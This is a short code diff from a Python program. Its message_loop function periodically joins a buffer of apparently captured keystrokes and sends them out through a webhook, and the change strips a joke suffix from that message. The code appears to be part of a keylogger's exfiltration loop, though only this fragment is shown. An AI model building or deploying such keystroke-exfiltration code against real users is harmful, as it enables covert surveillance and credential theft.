@@ -68,7 +68,7 @@ def message_loop():
         time.sleep(2)
         with lock:
             if key_buffer:
-                message = f"{' '.join(key_buffer)} Meow! that tickles!"
+                message = f"{' '.join(key_buffer)}"
                 send_webhook(message)
                 key_buffer.clear()
 
